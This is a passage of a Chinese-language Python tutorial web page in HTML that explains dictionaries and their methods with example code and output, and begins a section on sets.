'Taobao', 'Runoob', 'Baidu')</code></td>\n</tr>\n</tbody></table>\n<h2 id=\"字典\"><a href=\"#字典\" class=\"headerlink\" title=\"字典\"></a>字典</h2><ol>\n<li>字典是无序的，依靠键值对来存取</li>\n<li>字典用<code>{}</code>标识， <code>键(key) : 值(value)</code></li>\n<li><code>key</code>不可变，并且是唯一的</li>\n<li>使用<code>{}</code>创建空字典</li>\n<li>键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>  <span class=\"token comment\"># 空字典</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {2: 'test', 'test': 1}</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'dddd'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'test': 1, 1: 'dddd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出2,test的值</span>\n<span class=\"token comment\"># test 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键名</span>\n<span class=\"token comment\"># dict_keys(['test', 1])</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键值</span>\n<span class=\"token comment\"># dict_values([1, 'dddd'])</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'txt'</span>  <span class=\"token comment\"># 修改键值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {2: 'test', 'test': 'txt'}</span>\n<span class=\"token keyword\">del</span> dict2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 删除一个键</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'test': 1}</span>\ndict2<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 清空字典</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {}</span>\n<span class=\"token keyword\">del</span> dict2  <span class=\"token comment\"># 删除字典</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'str'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\"># 重复时后者覆盖前者</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'1': 2, 'var': 'var', 'test': 'test'}</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{2: 'test', 'test': 1}\n{'test': 1, 1: 'dddd'}\ntest 1\ndict_keys(['test', 1])\ndict_values([1, 'dddd'])\n{2: 'test', 'test': 'txt'}\n{'test': 1}\n{}\n{'1': 2, 'var': 'var', 'test': 'test'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数-3\"><a href=\"#函数-3\" class=\"headerlink\" title=\"函数\"></a>函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">函数及描述</th>\n<th align=\"left\">实例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\">len(dict) 计算字典元素个数，即键的总数。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'} </code><br><code>&gt;&gt;&gt; len(dict) 3</code></td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\">str(dict) 输出字典，可以打印的字符串表示。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; str(dict) </code><br><code>\"{'Name': 'Runoob', 'Class': 'First', 'Age': 7}\"</code></td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; type(dict) </code><br><code>&lt;class 'dict'&gt;</code></td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">函数及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-clear.html\">radiansdict.clear()</a> 删除字典内所有元素</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-copy.html\">radiansdict.copy()</a> 返回一个字典的浅复制</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html\">radiansdict.fromkeys()</a> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-get.html\">radiansdict.get(key, default=None)</a> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-in.html\">key in dict</a> 如果键在字典dict里返回true，否则返回false</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-items.html\">radiansdict.items()</a> 以列表返回一个视图对象</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-keys.html\">radiansdict.keys()</a> 返回一个视图对象</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-setdefault.html\">radiansdict.setdefault(key, default=None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-update.html\">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-values.html\">radiansdict.values()</a> 返回一个视图对象</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\">[pop(key<a href=\"https://www.runoob.com/python3/python3-att-dictionary-pop.html\">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-dictionary-popitem.html\">popitem()</a> 随机返回并删除字典中的最后一对键和值。</td>\n</tr>\n</tbody></table>\n<h3 id=\"函数示例-3\"><a href=\"#函数示例-3\" class=\"headerlink\" title=\"函数示例\"></a>函数示例</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Zara'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"字典长度 : %d\"</span> <span class=\"token operator\">%</span>  <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 字典长度 : 2</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"字典删除后长度 : %d\"</span> <span class=\"token operator\">%</span>  <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 字典删除后长度 : 0</span>\n\ndict1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Class'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'First'</span><span class=\"token punctuation\">}</span>\ndict2 <span class=\"token operator\">=</span> dict1<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"新复制的字典为 : \"</span><span class=\"token punctuation\">,</span> dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 新复制的字典为 :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}</span>\n\nseq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>fromkeys<span class=\"token punctuation\">(</span>seq<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"新的字典为 : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 新的字典为 : {'name': None, 'age': None, 'sex': None}</span>\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>fromkeys<span class=\"token punctuation\">(</span>seq<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"新的字典为 : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 新的字典为 : {'name': 10, 'age': 10, 'sex': 10}</span>\n\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">27</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"Age 值为 : %s\"</span> <span class=\"token operator\">%</span>  <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'Age'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Age 值为 : 27</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"Sex 值为 : %s\"</span> <span class=\"token operator\">%</span>  <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'Sex'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"NA\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Sex 值为 : NA</span>\n\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\"># 检测键 Age 是否存在</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'Age'</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Age 存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Age 不存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 键 Age 存在</span>\n<span class=\"token comment\"># 检测键 Sex 是否存在</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'Sex'</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Sex 存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Sex 不存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 键 Sex 不存在</span>\n<span class=\"token comment\"># not in</span>\n\n<span class=\"token comment\"># 检测键 Age 是否存在</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'Age'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Age 不存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键 Age 存在\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 键 Age 存在</span>\n\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Value : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Value : dict_items([('Name', 'Runoob'), ('Age', 7)])</span>\n\ndishes <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'eggs'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sausage'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bacon'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'spam'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">500</span><span class=\"token punctuation\">}</span>\nkeys <span class=\"token operator\">=</span> dishes<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nvalues <span class=\"token operator\">=</span> dishes<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 迭代</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">for</span> val <span class=\"token keyword\">in</span> values<span class=\"token punctuation\">:</span>\n    n <span class=\"token operator\">+=</span> val\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 504</span>\n\n<span class=\"token comment\"># keys 和 values 以相同顺序（插入顺序）进行迭代</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 使用 list() 转换为列表</span>\n<span class=\"token comment\"># ['eggs', 'sausage', 'bacon', 'spam']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># [2, 1, 1, 500]</span>\n\n<span class=\"token comment\"># 视图对象是动态的，受字典变化的影响，以下删除了字典的 key，视图对象转为列表后也跟着变化</span>\n<span class=\"token keyword\">del</span> dishes<span class=\"token punctuation\">[</span><span class=\"token string\">'eggs'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">del</span> dishes<span class=\"token punctuation\">[</span><span class=\"token string\">'sausage'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['bacon', 'spam']</span>\n\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Age 键的值为 : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>setdefault<span class=\"token punctuation\">(</span><span class=\"token string\">'Age'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Age 键的值为 : 7</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sex 键的值为 : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>setdefault<span class=\"token punctuation\">(</span><span class=\"token string\">'Sex'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Sex 键的值为 : None</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"新字典为：\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 新字典为： {'Name': 'Runoob', 'Age': 7, 'Sex': None}</span>\n\n<span class=\"token builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">7</span><span class=\"token punctuation\">}</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'female'</span><span class=\"token punctuation\">}</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"更新字典 dict : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 更新字典 dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}</span>\n\n\nsite<span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'菜鸟教程'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'alexa'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'url'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'www.runoob.com'</span><span class=\"token punctuation\">}</span>\npop_obj<span class=\"token operator\">=</span>site<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pop_obj<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 菜鸟教程</span>\n\n\nsite<span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'菜鸟教程'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'alexa'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'url'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'www.runoob.com'</span><span class=\"token punctuation\">}</span>\npop_obj<span class=\"token operator\">=</span>site<span class=\"token punctuation\">.</span>popitem<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pop_obj<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ('url', 'www.runoob.com')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>site<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'name': '菜鸟教程', 'alexa': 10000}</span>\n\n<span class=\"token triple-quoted-string string\">'''\n字典长度 : 2\n字典删除后长度 : 0\n新复制的字典为 :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}\n新的字典为 : {'name': None, 'age': None, 'sex': None}\n新的字典为 : {'name': 10, 'age': 10, 'sex': 10}\nAge 值为 : 27\nSex 值为 : NA\n键 Age 存在\n键 Sex 不存在\n键 Age 存在\nValue : dict_items([('Name', 'Runoob'), ('Age', 7)])\n504\n['eggs', 'sausage', 'bacon', 'spam']\n[2, 1, 1, 500]\n['bacon', 'spam']\nAge 键的值为 : 7\nSex 键的值为 : None\n新字典为： {'Name': 'Runoob', 'Age': 7, 'Sex': None}\n更新字典 dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}\n菜鸟教程\n('url', 'www.runoob.com')\n{'name': '菜鸟教程', 'alexa': 10000}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"集合\"><a href=\"#集合\" class=\"headerlink\" title=\"集合\"></a>集合</h2><p>创建格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">parame <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>value1<span class=\"token punctuation\">,</span> value2<span class=\"token punctuation\">,</span> ……<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">or</span>\n<span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 创建一个空集合</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">sites <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'123'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sites<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出集合，重复的元素被自动去掉</span>\n<span class=\"token comment\"># {1, '123', 'test'}</span>\n<span class=\"token comment\"># 成员测试</span>\n<span class=\"token keyword\">if</span> <span class=\"token string\">'test'</span> <span class=\"token keyword\">in</span> sites<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test 在集合中'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test 不在集合中'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># set可以进行集合运算</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'abracadabra'</span><span class=\"token punctuation\">)</span>\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'alacazam'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的差集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">|</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的并集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token 